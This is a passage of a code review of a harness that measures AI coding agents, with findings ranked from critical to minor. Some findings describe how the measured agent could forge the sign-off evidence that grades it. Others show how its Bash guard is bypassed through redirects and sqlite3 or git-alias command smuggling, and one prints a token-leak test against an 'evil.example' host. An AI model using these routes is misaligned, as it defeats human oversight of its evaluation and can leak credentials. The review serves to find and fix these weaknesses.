SEVERITY: Important — confirmed against parity.md:4-5 versus the 5 cross-arm assertions in
test_parity.py.

**tests-03** · `tests/unit/…/draft/test_gate.py:58` · test-gap
`test_unknown_cluster_id_is_found` asserts `any("c9999" in finding)`, and the mutation
produces two findings that both contain it, so deleting either rule leaves the test green.
SEVERITY: Minor — confirmed by a spied run printing both findings; the input only the
timeline rule catches cannot arise normally, since `write_checkpoint` refuses it
(`test_checkpoint.py:60-67`).

**tests-04** · `tests/unit/…/draft/test_gate.py:33-117` · test-gap
All ten mutation tests assert `any(needle in finding)` and none asserts the finding
*count*, so a gate over-reporting on every input passes all ten;
`test_non_increasing_cluster_ordinals_are_found` already produces a second, unasserted
finding.
SEVERITY: Minor — confirmed by the spied run; `test_clean_workspace_gates_clean:30` still
pins `== ()` on a clean workspace.

**tests-05** · `tests/unit/…/test_cli_conventions.py:67` · test-gap
`TRACKED_HELPERS` covers 4 of the README table's 6 rows; the uncovered "JSONL corpus
readers" and "Forge snapshot readers" rows name concepts rather than `def` names, so
`_defines()` (which greps `^def <name>(`) cannot be extended to them without rewriting the
rows — and the docstring at `:118-122` records that this table has already drifted twice.
SEVERITY: Minor — confirmed against README.md:475-482 and a grep of both rows' modules,
neither of which has drifted today.

**tests-06** · `tests/unit/…/draft/test_questions.py:47` · test-gap
`test_dump_is_idempotent` round-trips the serializer through itself and never asserts
fidelity to the source.
SEVERITY: Minor — confirmed by mutation (6/6 green with `answered_by` stripped inside
`dump_questions`), which shows the field is unpinned through a dump while `dump_questions`
is correct today.

**tests-07 onward** — pending; truncated in delivery. One correction already supplied:
tests-10 cites `completeness.py:245-247` for the `CompletenessError` on an unreadable
manifest; concurrent work moved that raise to line 261. The behaviour is unchanged and the
finding stands.

## The code moved while it was being reviewed

This is recorded before the findings are ranked, because it bounds what any of them can
claim.

The plan for this review asserted that "the tree is free — no campaign has touched
`~/arfc-experiments/campaigns/` today, the harness submodule is clean at its pinned
pointer, and the working tree has no uncommitted changes." That was true when it was
written and false within the hour. **Another session was implementing on this same branch,
in this same worktree, throughout the review window.**

The reflog is unambiguous. Four commits here are this review's; two interleaved ones are
not:

| Time | Commit | Whose |
|---|---|---|
| 13:59:58 | `442959aab` plan the whole-codebase review | review |
| **14:00:51** | **`90817ebe8` correct the miscount that produced the false heading** | **other session** |
| 14:05:15 | `4776df34a` record the review baseline | review |
| 14:07:43 | `ce8aa733e` verify the command inventory before dispatching readers | review |
| **14:26:27** | **`7d1efaad2` make a checkpoint's claim ids readable by name** | **other session** |
| 14:27:53 | `dded8e643` collect findings from three of five slice reviews | review |

And inside the `harness` submodule, two commits landed mid-review — `1ac26f1` at 14:21:50
("read a run's transcript once per attempt, not twice") and `4c56538` at 14:24:09 ("slice
a run's transcript by session"), touching `per_cluster.py`, `stream.py` and their tests.
The submodule HEAD is therefore `4c56538`, two commits ahead of the pointer `0b62bf38`
this repository records; the parent's ` M` on that path is a gitlink gap, not a dirty
tree. Two further untracked files, `experiment/summary.py` and
`experiment/tests/test_summary.py`, are in-progress work that had not been committed when
this was written.

### What this costs the review

**The baseline describes a state that no longer exists.** The 390 / 339 / 40 counts were
measured at 14:05, before both harness commits and before `7d1efaad2`. They remain an
honest record of that moment and are not re-run here, because a second baseline taken
after further concurrent commits would be equally stale.

**Some citations have moved.** `draft/completeness.py` shifted by about fourteen lines, so
finding tests-10's citation of `completeness.py:245-247` is now line 261 — behaviour
unchanged, finding intact. The `tests` reviewer's untriaged substring-assertion hits in
`test_per_cluster.py` describe that file as it stood before `1ac26f1`. Every line number
in this report should be treated as accurate to the review window, not to HEAD.

**One reviewer's scratch file was overwritten by another's.** Running five agents plus an
implementer in one worktree is not free, and this is the cheapest possible illustration of
why.

### A wrong accusation, and how it was settled

A modified `draft/completeness.py` appeared mid-review, renaming `_claim_ids` to
`claim_ids_of` with a docstring justifying the change as "Public because the experiment
harness attributes claims per cluster while a run is in flight." Because the `harness/`
reviewer owns exactly that code, this review accused it of implementing rather than
reviewing.

**That accusation was wrong**, and the reviewer refuted it with better evidence than the
accusation had: it had never called an edit tool at all, every write went to its
scratchpad, and — decisively — it had read `per_cluster.py` in full and established that
the file performs no claim-id extraction of any kind, with zero occurrences of `claim_id`,
`claim_ids` or `_claim_ids`. So the new docstring asserts a caller that does not exist. The
reviewer declined to report the refactor as a finding of its own on the grounds that doing
so would put a fabricated defect into the review. That was the right call, and it is worth
recording as its own observation:

**`draft/completeness.py:91`'s `claim_ids_of` carries a docstring that justifies its
public visibility by naming a caller in `harness/experiment/` which does not exist.**
SEVERITY: Minor — confirmed against `harness/experiment/per_cluster.py`, where a grep for
`claim_id`, `claim_ids` and `_claim_ids` returns zero hits, and whose import set contains
nothing from `draft/`.

The general lesson, which this project has recorded before and just paid for again: a
worktree isolates the checkout, not the branch. `git status` stays clean while HEAD moves
underneath. Before attributing an unexpected change to an agent you dispatched, read the
reflog.

## Operational hazard — do not run two commands against the pilot

Recorded here rather than in the findings list because it is a live risk to existing
evidence, not a defect to schedule.

**Do not run `python -m experiment audit` or `python -m experiment analyze` against
`~/arfc-experiments/campaigns/pilot-aioquic-w02-11-20260831/`.** Per runner-01, today's
code recomputes `integrity: false` from the pilot's unchanged bytes, with hundreds of
fabricated `executed_out_of_arm` entries; `cli.analyze` calls `audit_campaign` first,
which rewrites all six `audit/*.json` in place, and then crashes before regenerating the
analysis. The result is destroyed evidence and no replacement. The pilot directory already
contains `audit.pre-mixed-family-fix/`, a hand-preserved copy of an earlier `audit/`,
which indicates this overwrite path has fired before.

### Reader `core` — remaining findings and assessment (complete)

**core-11** · `pipeline/cli.py:160-164` · correctness
`--until` naming a stage earlier than `--from` breaks on the first iteration, so the run
exits 0 having performed nothing and printed nothing.
SEVERITY: Minor — confirmed by reading; `_finish` with `performed=[]` returns 0 and prints
only under `--json`.

**core-12** · `pipeline/cli.py:236-237` · doc-drift
The docstring promises exit 1 when "a stage was asked for that this command does not
perform", but `--from mining` reaches the boundary branch at `:175` and exits 0.
SEVERITY: Minor — confirmed by reading; only the two missing-argument `PipelineError`s
reach the exit-1 path.

**core-13** · `schema.py:121` · correctness
`testable` is passed through with no type check while every neighbouring field is
validated, so `testable: "no"` stores a truthy string in a field typed `bool | None`.
SEVERITY: Minor if no consumer branches on it; Important otherwise — settled by grepping
the harness for `testable`. **Settled by the `server` reviewer, in a different slice:
nothing reads `testable` today, so this resolves to Minor** — see the `cli.py:27-34,82`
finding below, which independently reached the same conclusion from the other side.

**core-14** · `tests/unit/…/test_schema.py`, `test_anchors.py`, `pipeline/test_cli.py` ·
test-gap
Nothing covers a YAML syntax error, a duplicate requirement id, a symbolic-ref commit, or
a mixed-type id map (`sorted()` at `schema.py:152` raises an uncaught `TypeError` on `1`
and `"B"` together — confirmed), and no test runs the pipeline past mining.
SEVERITY: Important — confirmed: a grep for `YAMLError`/`ScannerError` over the suite
returns nothing, `test_anchors.py:22` only ever pins a resolved `rev-parse HEAD` result,
and **every finding core-01 through core-09 is invisible to the current suite**.

**Assessment.** The slice is sound where it matters most: the evidence layer itself —
`promotion.adjudicate`, the status ranking, the anchor digests — is carefully reasoned and
honestly tested, and the defects cluster in the plumbing around it rather than in the
promotion rule. Fix core-01 first: the pipeline's default path exits 0 without ever
performing `check` or `gate`, so the one number the instrument exists to produce goes
unverified on the path most runs take.

### Reader `server` — further findings

Delivered without ids after server-03; numbered here in the order received. Still
truncated — a further remainder was requested.

**server-04** · `questions.py:198-200` · correctness
One `author_confirmed_exact_text` boolean writes `signed_off_by` to every claim on the
question, including claims that received no anchor and claims added to the question after
it was asked, though the docstring at `:138` says "the exact claim wording", singular.
SEVERITY: Important — confirmed against `promotion.py:70`, where any `signed_off_by`
returns `Status.CONFIRMED`, so every claim so marked reaches top status on one author's
confirmation of one wording.

**server-05** · `claims.py:110-111` · correctness
`body = dict(existing)` then `body.update(fields)` preserves `signed_off_by` across a
`text` change, so a re-worded claim keeps a sign-off certifying wording the author never
saw; excluding `signed_off_by` from `_WRITABLE_FIELDS` blocks setting it but not
inheriting it.
SEVERITY: Important — confirmed against `promotion.py:67-70`; the re-worded claim stays
CONFIRMED.

**server-06** · `questions.py:157-163` · security
The transcript is any file the caller names, `answered_by` is free text, and
`author_confirmed_exact_text` is caller-supplied, so nothing binds a sign-off to a human
and the agent being audited can author the evidence that grades it.
SEVERITY: Critical if the runner grants the agent Write or Bash into the workspace;
Important otherwise — settled by whether the runner's tool allowlist permits writing
`interviews/`.

**server-07** · `gates.py:87-88,133-137`, `queries.py:142-143` · api-contract
Both gates read `out/report.json` and `out/gate-report.json` whenever the file exists,
with no check that this run wrote it, so a previous run's report is returned beside a
failing exit code, unmarked; `queries.status` returns it with no exit code at all, and
`draft.py:138` surfaces stale findings beside `rolled_back: True`.
SEVERITY: Important — confirmed against `ai_rfc/cli.py:85-90` and `draft/cli.py:154-158`,
both of which return 1 before writing any report.

**server-08** · `cli.py:27-34,82` · api-contract
`_parse_fields` yields strings only and `cli.py:82` advertises `testable` as a `--field`
key, so the CLI arm writes `testable: 'false'` where the MCP arm writes `testable: false`
— the documented path, not misuse.
SEVERITY: Important — confirmed by round-tripping through `schema.load`/`schema.dump`,
which returns `str`, re-emits `'false'`, and neither coerces nor rejects; nothing reads
`testable` today, so the damage is to the compared artifact, not to adjudication. **This
is the finding that settles core-13.**

**server-09** · `tests/test_parity.py:26-58` · test-gap
The byte-for-byte upsert parity test sends `intent=intended`, a string, so it exercises the
one case where the coercion above is invisible; the single non-string writable field is the
one it never sends.
SEVERITY: Important if the campaign treats manifest bytes as an arm-comparison outcome;
Minor otherwise — settled by whether the campaign diffs manifests across arms.

**server-10** · `questions.py:76-85,181-201` · correctness
`questions.yaml` is committed before the manifest is normalized, so a manifest validation
failure leaves the register recording an answered or newly drafted question the manifest
does not reflect, with no rollback.
SEVERITY: Important if a schema failure is reachable between the two writes; Minor
otherwise — settled by whether any `_normalize_and_write` input can fail validation after
`_document` loaded cleanly.

**server-11** · `questions.py:55` · correctness
`set(claim_ids) <= set(entry.claim_ids)` blocks only subsets, so re-asking an identical
question with one extra claim id bypasses the "do not ask twice" guardrail; the docstring
matches the code, so the gap is in the rule rather than the prose.
SEVERITY: Minor — confirmed by inspection; the bypass costs an author a duplicate
question, not evidence integrity.

**server-12** · `gates.py:23-31` · api-contract
`_run` discards stdout entirely, so a substrate reporting on stdout would yield
`{exit_code: N, stderr: []}` — a failure with no stated reason.
SEVERITY: Minor — confirmed by grep; both invoked CLIs write only to stderr today, so this
is latent.

**server-13 onward** — pending; truncated in delivery.

## Confirmed defects

Every severity below was settled against a named artifact. Where settling changed a
reviewer's estimate, that is stated — three findings were downgraded and two escalated,
and the escalations were only visible by combining slices.

### Critical

**C-1. An agent can fabricate the evidence that grades it, in every arm.**
Assembled from `server-01`, `server-04`, `server-06` and settled here. No single reviewer
could see this: the tools half is in the `runner` slice, the sign-off half in the `server`
slice, and the promotion rule in `core`.

The chain, each link confirmed:

1. `arms.py:21` — `READ_TOOLS = ("Read", "Edit", "Write", "Grep", "Glob")`. Despite the
   name, it contains `Edit` and `Write`, and `arms.py:46,53,60` give it to **all three
   arms**.
2. `enforcement.py:208` — the `PreToolUse` guard's matcher is `"Bash"`. Only Bash is
   confined. The module's own docstring (`:1-9`) records that `--allowedTools` cannot
   constrain a built-in tool, so `Write` is unguarded by construction.
3. The agent can therefore write any file into its workspace, including
   `interviews/<anything>`.
4. `questions.py:157` — `answer-record` accepts a caller-named transcript; `answered_by`
   is free text; `author_confirmed_exact_text` is caller-supplied.
5. `questions.py:163` — the only check that an answer happened is
   `quote not in transcript_path.read_text()`, and `"" in anything` is True, so an empty
   quote passes.
6. `questions.py:198-200` — one `author_confirmed_exact_text` boolean writes
   `signed_off_by` to **every** claim on the question.
7. `promotion.py:70` — `if claim.signed_off_by: return Status.CONFIRMED`.

So the agent under measurement can raise any claim to `confirmed` — the top status, and
the one the headline metric counts — on evidence it authored itself, without a human
existing. The package README names developer sign-off as one of only two mechanisms that
can move `checked_fraction` off zero; this is the other end of that same lever.
SEVERITY: Critical — confirmed against `arms.py:21,46,53,60` (Write in every arm),
`enforcement.py:208` (matcher `"Bash"` only), and `promotion.py:70`. The `server`
reviewer filed this as "Critical if the runner grants the agent Write or Bash into the
workspace; Important otherwise"; the condition is satisfied for all three arms.

**C-2. `pipeline run` never validates the manifest.** (`core-01`)
`next_stage` skips `RECOMPUTED` stages (`pipeline/state.py:307`) and both `check` and
`gate` are `RECOMPUTED` (`:276,279`), so a default run goes from `views` to `prose`
without validating anything. `State.RECOMPUTED`'s own docstring at `:46-49` says the
opposite — "the runner just performs it".
SEVERITY: Critical — confirmed against a probe workspace holding a manifest whose stored
`confirmed` rests on one ADR anchor: `pipeline run <ws> --strict --json` exits 0 with
`performed: []`, while `pipeline run <ws> --from check --strict` on the same workspace
exits 3 and reports the violation. Settled further during this review: commit `a20cc9a7b`
("pipeline run performs six of the eight commands, not four", 13:39:50 today) changed
**documentation only** — five doc and `__init__`/`entrypoints` files, no behaviour — so it
aligned the prose to the skip and left the enum's contradictory docstring standing.

**C-3. A failed checkpoint is unrecoverable without manual `rm -rf`.** (`core-02`)
`write_checkpoint` creates the directory and writes `manifest.yaml` before reading
`timeline.json` (`draft/checkpoint.py:74-98`), so a failure there leaves a directory
`:69` then refuses to overwrite forever, and `pipeline/state.py:221-224` counts it
unfrozen and routes the operator back into the refused stage.
SEVERITY: Critical — confirmed: first run exits 1 leaving `['manifest.yaml']`; after
repairing the input the retry exits 1 with "already exists; a checkpoint is written once".

**C-4. The GitHub pagination loop sends the bearer token to a host the remote chooses.**
(`evidence-02`)
`_paginated_github` (`forge/fetch.py:131-135`) takes the next URL from the remote's `Link`
header and hands it to `_get_json`, which attaches `Authorization` (`:109-110`) with no
host check. The loop is also unbounded.
SEVERITY: Critical — confirmed against an injected-transport run: a page-1
`Link: <https://evil.example/steal>; rel="next"` produced a second request to
`https://evil.example/steal` carrying `Authorization: Bearer SECRET-TOKEN`.

**C-5. Re-running `audit` or `analyze` fabricates integrity violations and destroys the
evidence.** (`runner-01`)
Nothing compares a frozen campaign's recorded `git`/`prompt_sha256`/`plugin_root` against
the running checkout, while every constant that classifies a transcript is a literal that
moves with a rename. `cli.analyze` calls `audit_campaign` first, rewriting all six
`audit/*.json` in place, then crashes before regenerating the analysis.
SEVERITY: Critical — confirmed against
`~/arfc-experiments/campaigns/pilot-aioquic-w02-11-20260831`: stored audits show
`integrity: true`, while today's code recomputes `integrity: false` from the identical
bytes — 177 fabricated out-of-arm entries for B1, 41 for C1, 170 for A1, and arm A drops
out of the summary entirely. See the operational hazard above.

**C-6. Recording a question with an explicit id silently overwrites a recorded human
answer.** (`server-02`)
`question_id` is checked for collision nowhere (`questions.py:62-67`), and
`dump_questions` keys by id (`draft/questions.py:152`), so the write succeeds, reports
success, and the previous entry — including a human answer — is gone.
SEVERITY: Critical — confirmed against `draft/questions.py:152`.

### Important

`core-03` duplicate requirement ids silently drop a claim · `core-05`/S-5 the normative
gate compares ids not content · `core-06` a YAML syntax error escapes every handler ·
`core-07` `completeness` exits 1 where `gate` exits 3 on the same input · `core-08` four
`clusters.jsonl` readers, three unguarded · `core-09` `signed_off_by` accepts `"   "` ·
`core-14` the suite is blind to every one of core-01..core-09 · `evidence-04` provenance
records the ref as typed, not the resolved sha · `evidence-05` the test guarding it cannot
fail · `evidence-06` corpus JSON errors escape the contract · `evidence-07` a malformed
record leaves a permanently-refused snapshot · `evidence-09` `fidelity_ceiling` grades on
token presence, not observed denials · `evidence-13` the fixture cannot observe
evidence-01 · `server-04` one boolean signs off every claim on a question · `server-05` a
re-worded claim inherits its old sign-off · `server-07` gates return a previous run's
report unmarked · `server-08` the CLI arm writes `testable: 'false'` where MCP writes
`false` · `tests-01` the parity gate passes on a name alone · `tests-02` parity.md claims
16 pairs are asserted; 5 are · S-1 the 200-row corpus cap is invisible in the return value
· S-2 the transcript path is unsanitized, absolute paths included · S-3 no `urlopen`
timeout · S-6 `--verify` compares only `patches`.

**Escalated by settling.** `evidence-08` — views cannot be traced to the forge snapshot
they came from, and `--verify` cannot detect a swap. The reviewer filed it as "Important
if more than one snapshot exists for a target; Minor otherwise".
SEVERITY: Important — confirmed: `reconstructions/` holds two MARK snapshots,
`snapshot-2026-08-25T15-38-20Z` and `snapshot-2026-09-01T09-35-27Z`.

**Downgraded by settling.** `evidence-03` — `api_base` ignores `self.host` for
`kind == "github"`, so `GITHUB_TOKEN` would go to api.github.com against a GitHub
Enterprise host. Filed as "Critical if GITHUB_TOKEN is set while `--host github` targets a
non-github.com host".
SEVERITY: Important — confirmed: every recorded snapshot's `meta.json` is either
github.com or a GitLab host whose `api_base` correctly matches it
(`gitlab.cylab.be` → `https://gitlab.cylab.be/api/v4`). The code defect is real; no
recorded invocation reaches it. It remains a trap for the first GitHub Enterprise target.

### Minor

`core-10` a spurious second finding when a predecessor tag is unreadable · `core-11`
`--until` before `--from` performs nothing and exits 0 · `core-12` a documented exit 1
that cannot occur · `evidence-12` `history/aggregates.py` is dead code, 56 lines ·
`evidence-14` an undeclared connection leak on the missing-JSONL path · `evidence-15`
GitLab pagination `ValueError` and unbounded loop · `evidence-16` `\x01` in a path is
parsed as a commit marker · `evidence-17` duplicate landing shas collapse silently ·
`evidence-18` three small items · `server-11` the duplicate-question guard blocks only
subsets · `server-12` `_run` discards stdout · `tests-03`..`tests-06` substring assertions
that cannot distinguish which rule fired · the `claim_ids_of` docstring names a caller
that does not exist.

**Downgraded by settling.** `core-04` — `commit` is only `str()`-coerced, so `commit: HEAD`
or a branch name verifies against a moving reference while looking pinned. Filed as
"Critical if any authored manifest carries a non-40-hex commit; Minor otherwise".
SEVERITY: Minor — confirmed against every `manifest.yaml` under `reconstructions/`: one
distinct commit value, `b901f36095d746ee99dfa85b3d2ad1fbe5f2c533`, 40 hex characters. The
hazard is real and untested (`test_anchors.py:22` only ever pins a resolved sha), but no
authored manifest exercises it.

`core-13` — `testable` is stored without a type check. Filed as "Minor if no consumer
branches on it; Important otherwise — settled by grepping the harness".
SEVERITY: Minor — settled from the other side by the `server` reviewer, who established
that nothing reads `testable` today (`server-08`). The two reviewers reached the same
conclusion independently from opposite slices.

### Unsettled — reported as conditional, not confirmed

- `evidence-01` (merge commits carry `file_count=0` while their own first-parent diff is
  non-empty, and `file_count` is documented as "the true number of paths"). Critical if
  any merge on a target's spine has a non-empty first-parent diff. Needs a real clone,
  which this session could not reach. **This is the highest-value unsettled item**: the
  reviewer confirmed the mechanism against a purpose-built repository, so only the
  question of whether real targets exercise it remains.
- `server-22` (an `mcp>=1.0` lower bound) — PyPI is unreachable through the sandbox proxy.
- `runner-02`, `runner-03` — both settle on a `hook_response.exit_code` tally that no run
  currently performs.
- `evidence-10`, `evidence-11`, `server-09`, `server-10` — each carries its settling check
  in its severity line.

### Reader `runner` — remaining findings and assessment (complete)

**runner-04** · `enforcement.py:204` · security
`" ".join([python, str(guard), …])` quotes the prefixes with `repr` but not the interpreter
or guard paths, so a space in either splits the hook command, exec fails, and a non-2 exit
permits the call while `pretooluse_hook_starts` still increments.
SEVERITY: Important if any campaign runs from a path containing a space; Minor otherwise —
settled by the pilot's `runs/*/guard.json`, which shows space-free paths; the CLI's
exec-failure exit code could not be reached.

**runner-05** · `metrics.py:192-203` · correctness
Arm C gates on `"--cluster" in command` (substring) then calls `parts.index("--cluster")`
(token), so `--cluster=c-0007` raises an uncaught `ValueError` that aborts
`analyze_campaign` for **every** run; arm B takes `parts[2]` unvalidated, so
`ai_rfc checkpoint --help` yields the cluster id `"--help"`.
SEVERITY: Important — confirmed by execution (the `ValueError` reproduced) **and against
the pilot's own `analysis/aggregate.json`, which already carries the phantom point
`{'cluster_id': '--help', 'index': 64}` in B1's trajectory.** Published pilot data is
already contaminated by this.

**runner-06** · `metrics.py:255-265` · correctness
`completed_so_far` increments per checkpoint *call*, never deduplicated by cluster and
never cross-checked against `tool_results`, so a retried checkpoint pushes
`completed_so_far / window_size` above 1 and the AUC with it.
SEVERITY: Important if any run checkpoints one cluster twice; Minor otherwise — measured
`auc = 1.47` on a two-cluster synthetic, against `test_metrics.py:44`'s own `auc <= 1.0`
assertion, and confirmed against the pilot, where checkpoint ids are unique in all six
runs.

**runner-07** · `metrics.py:185-204` vs `render.py:144-230` · duplication
`_cluster_of_call` hard-codes the exact command strings the arm tables emit; reword a table
and `checkpoint_calls` returns `[]`, giving `auc` 0.0 and `tokens_to_first_completion`
None with no error.
SEVERITY: Important if a table's checkpoint wording changes without `metrics` following;
Minor otherwise — settled by a parity test asserting `_cluster_of_call` against each
rendered table, which does not exist.

**runner-08** · `audit.py:298`, `stream.py:16-19` · correctness
`_DENIAL` matches bare `permission`/`denied`, so an executed out-of-arm call erroring with
`Permission denied` is scored denied, dropped from `violations`, and `integrity` stays
True.
SEVERITY: Important if a run produces a non-denial error carrying that wording; Minor
otherwise — confirmed against all six pilot audits, where every one of the 14 bypasses
matched by `tool_use_id` from the result event, so the text fallback fired zero times.

**runner-09** · `enforcement.py:151-185`, `arms.py:61` · security
A group need only *begin* in prefix and `>` is not an operator, so
`git log > $AI_RFC_WORKSPACE/revisions.yaml` is allowed, audited `bash:git` in-arm, and
never reaches `hand_edits`; `sqlite3 db ".shell <cmd>"` and `git -c alias.x='!cmd' x` are
likewise allowed and in-arm.
SEVERITY: Important if any arm-C run uses a redirect or a dot-command; Minor otherwise —
confirmed against the pilot transcripts, which contain zero redirect writes, zero
`.shell`/`.system`/`.once` and zero `-c alias.`, so the pilot's `hand_edits` figures
(C=87, B=1, A=0) are exact.

**runner-10** · `per_cluster.py:223,273,343` · resource
`time_left` is computed once per cluster but passed to `spawn` on every attempt while
`budget_left` is recomputed, so a cluster whose first attempt exhausts the cap gets a
second full `time_left` and the run can overrun `campaign.timeout_s` by nearly 2×.
SEVERITY: Important if a per-cluster run ever times out on attempt 1; Minor otherwise —
read-verified at current HEAD; no per-cluster campaign has produced artifacts.

**runner-11** · `runner.py:238` vs `:34` · security — **S-7 confirmed and widened**
The tamper digest covers `guard.json` and never `guard.py`, nor `enforcement.py`, which
holds `is_allowed`. `guard_stats.unmodified` attests to the pointer, not the enforcement.
SEVERITY: Important if the harness tree is writable during a run; Minor otherwise — the
pilot's recorded and mounted digests match on every run, which proves only that the
settings file was untouched.

**runner-16** · `metrics.py:360-401`, `per_cluster.py:98-136,332` · correctness
Both judge the surface from `init_event`, the *first* init in the concatenated transcript,
and `surface_shortfall` is gated on `if not surface_judged`, so an MCP server that connects
at session 1 and fails at session 5 leaves `surface.intact` True and the rest of the window
runs unvalidated and is averaged in.
SEVERITY: Important if a per-cluster arm-A run loses its server mid-window; Minor otherwise
— no per-cluster campaign has produced artifacts. `stream.session_events` now exists, so
the fix is a slice per session.

**runner-19** · `summary.py:165-194,317-321` · correctness
`seed_seen` catches bare `Exception` and returns an empty set, so `claim_delta.new_ids`
becomes every id the checkpoint holds and the cluster reads as having introduced the entire
workspace; disclosed only by a sibling `errors` string, with no marker on `claim_delta`
itself.
SEVERITY: Minor — `summary.py:1-11` scopes the module to display and explicitly excludes it
from `metrics`, whose contract is to recompute; no published figure reads it.

**Minor, one line each.** `runner-12` `report.py:55-63` vs `metrics.py:243` — two different
token totals both labelled "tokens", only one in `DEFINITIONS`; confirmed against
`analysis/aggregate.json` (A1: 26,588,444 vs 26,498,866, ≈0.34%). `runner-13`
`metrics.py:437,472-476,508-511` — audit-less runs silently dropped from
`integrity_rate`/`bypass_attempts`/`errors`/`hand_edits` with no count beside them, unlike
`priced`/`broken`. `runner-14` `cli.py:490-513` — `audit` and `analyze` exit 0 whatever they
find, though `cli.py:370-373` reserves 3 for "a gate said no"; Important if a campaign is
ever script-driven, settled by `experiment-protocol.md`'s 12 unchecked boxes. `runner-15`
`preflight.py:276-302,321-338` — `run_invocation` omits `start_new_session`, orphaning the
MCP server on timeout, which is exactly what `spawn.py` was extracted to prevent and is
unused here; `_ai_rfc_connected`/`_mcp_status` duplicate `stream` verbatim; nothing gates
`campaign init` on preflight. `runner-17` `audit.py:109-136`, `metrics.py:139-145` —
`edit_target` says paths are "resolved against the workspace" but never calls `resolve()`.
`runner-18` `summary.py:126-131,132-139` — an unreachable branch after a `for/else`, and
binary `numstat` lines (`-\t-\tpath`) fail `isdigit()` so binary changes vanish from
`files`. `runner-20` `summary.py:221-231` — a *third* token accounting beside
`metrics.trajectory` and `report._run_rows`; none of the three is named canonical.
`runner-21` `summary.py` — no production caller at `5fa8891`; only a docstring mention and
its own test reference it.

**Assessment.** The metric logic is unusually careful about *statistical* honesty —
undecided is never scored as failed, unpriced is never zero, void runs are excluded and
counted — but it has no notion of *provenance* honesty, and that is where it breaks:
re-analysis is idempotent only against the code that produced it, and re-running it
destructively rewrites the evidence with confidently wrong numbers. Fix runner-01 first,
as a refusal: have `load_campaign` compare `campaign.git`/`prompt_sha256`/`plugin_root`
against the live checkout and raise `ExperimentError` on mismatch, and make
`audit_run`/`analyze_run` refuse to overwrite a record produced under a different revision
— not a compatibility shim for the old names. Second priority is runner-02, because it is
cheap and converts three read-only findings into observed ones: every transcript already
carries `hook_response` events with `exit_code` and `outcome`, and `guard_stats` reads only
`hook_started`.

### Reader `tests` — remaining findings and assessment

**tests-07** · `tests/unit/…/draft/test_questions.py:43` · test-gap
`assert questions[1].answer is not None` where the fixture supplies the exact string at
`:30`, while the adjacent line pins `answered_by` by value.
SEVERITY: Minor — confirmed against test_questions.py:30 versus :43.

**tests-08** · `tests/unit/…/pipeline/test_stages.py:29,32` · correctness
`set(BY_NAME) == {item.name for item in STAGES}` and `stage(item.name) is item` compare a
computation to itself, since `stages.py:74` defines `BY_NAME` as that exact comprehension
and `stages.py:89` is `return BY_NAME[name]`; only `:30` (`len(BY_NAME) == len(STAGES)`)
can fail.
SEVERITY: Minor — confirmed against stages.py:74,89.

**tests-09** · `tests/unit/…/draft/test_gate.py:120` · test-gap
`pytest.raises((GateError, OSError))` cannot distinguish the gate detecting a missing
register from a raw `FileNotFoundError` leaking out of it.
SEVERITY: Minor — confirmed against gate.py:32 (`GateError(ValueError)`, not an `OSError`)
and draft/cli.py:161, which catches the same union and returns 1, so both read alike in
production.

**tests-10** · `tests/unit/…/draft/test_completeness.py:210-219` · naming
The clean-workspace test passes `tmp_path / "m2.yaml"`, a file the `draft_workspace`
fixture writes but does not return in its dict, so the coupling is invisible at the call
site.
SEVERITY: Minor — confirmed against draft/conftest.py:107-108; `completeness.build` raises
`CompletenessError` on a missing manifest (`completeness.py:261`, post-`7d1efaad2`), so it
cannot pass vacuously.

**Two shapes hunted and found clean**, stated rather than left as silence. `EntryPoint` has
no `__post_init__`, so `test_cli_conventions:146` can genuinely fail; `STAGES` carries an
explicit `ordinal` field rather than an enumerate, so `test_stages:25` can genuinely fail;
and there are **zero** `mock`, `MagicMock`, `patch` or `assert_called` occurrences across
all 10,387 lines. Over-mocking is simply not a problem in this suite.

**Re-grep after the concurrent commits.** Nothing changed in substance.
`test_per_cluster.py` holds 11 substring-assertion hits both before `1ac26f1` and after
`4c56538`, and the diff across both commits changes no line matching that pattern.
`test_stream.py` went from 9 hits to 10, but the added hit is a false positive of the grep
(a comprehension's `for e in`, not a substring test); the four assertions `4c56538`
actually added are all exact-equality, including two empty-case guards.

**Coverage, stated honestly.** Read in full: 4 of the 8 conftests (`ai_rfc/`, `draft/`,
`harness/experiment/tests/`, `server/tests/`) — the `pipeline/`, `history/`, `views/` and
`coverage/` conftests were not opened; `test_cli_conventions.py`; `test_parity.py`; all
four `draft/` suites; `test_metrics.py`; `pipeline/test_stages.py`; `test_enforcement.py`
to line 80 of 157; `parity.md`; the README duplication table. Grepped only: everything
else. **Untriaged: roughly 70 substring-assertion hits in the harness tree**, concentrated
in `test_workspace.py` (21), `test_render.py` (13), `test_cli_campaign.py` (12) and
`test_per_cluster.py` (11).

**Assessment.** The suite is trustworthy where it measures. The metrics, enforcement and
audit tests assert exact numbers and deliberately guard the degenerate always-zero and
always-None readings that would otherwise make them pass for free. The weakness is
concentrated in the gates that check *registers* rather than behaviour. The single weakest
test is `test_parity.py:85`: it is the completeness check on the experiment's stop-ship
instrument and asserts nothing behavioural, only that a name appears somewhere in a
markdown file.

## Coverage limits — what this review does not cover

Stated plainly rather than left for a reader to infer.

**The harness moved six commits during the review.** The `runner` and `server` slices were
read at `0b62bf3`. HEAD is now `a33a312`, and `git diff --stat 0b62bf3 HEAD` reports
**+1,120 / −48 across 8 files**:

| File | Change | Reviewed? |
|---|---|---|
| `experiment/summary.py` | +384, entirely new | Yes — read at `5fa8891`; runner-18..21 |
| `experiment/per_cluster.py` | +204 | Partly — two citations re-anchored, findings unchanged |
| `experiment/progress.py` | +88 | **No — the new 88 lines are unreviewed** |
| `experiment/stream.py` | +36 | Yes — the cited range is above the insertion point |
| four test files | +456 | Partly — the `tests` reviewer re-grepped two of them |

So: the `runner` slice covers `0b62bf3` plus a read of `summary.py` at `5fa8891`. It does
**not** cover the new half of `progress.py`. Nothing in this report speaks to those 88
lines.

**Line numbers are accurate to the review window, not to HEAD.** `draft/completeness.py`
shifted about fourteen lines under commit `7d1efaad2`; that one citation is corrected in
place. Others in the harness may have moved.

**Roughly 70 substring assertions in the harness test tree were not triaged**, per the
`tests` reviewer's own account above.

**The `server` slice is complete after all.** Its delivery truncated three times, and an
earlier version of this section recorded the tail as missing. It arrived; server-21 to
server-23 are at the end of this report. One of them, the `mcp>=1.0` lower bound, remains
the single finding in the whole review that nobody could settle — PyPI is unreachable
through the sandbox proxy, and the settling command is named in its severity line.

**The `harness/` findings cannot be fixed this cycle** by the user's decision, so S-1, S-2
and S-7 — a silent 200-row truncation, an unsanitized transcript path, and a tamper check
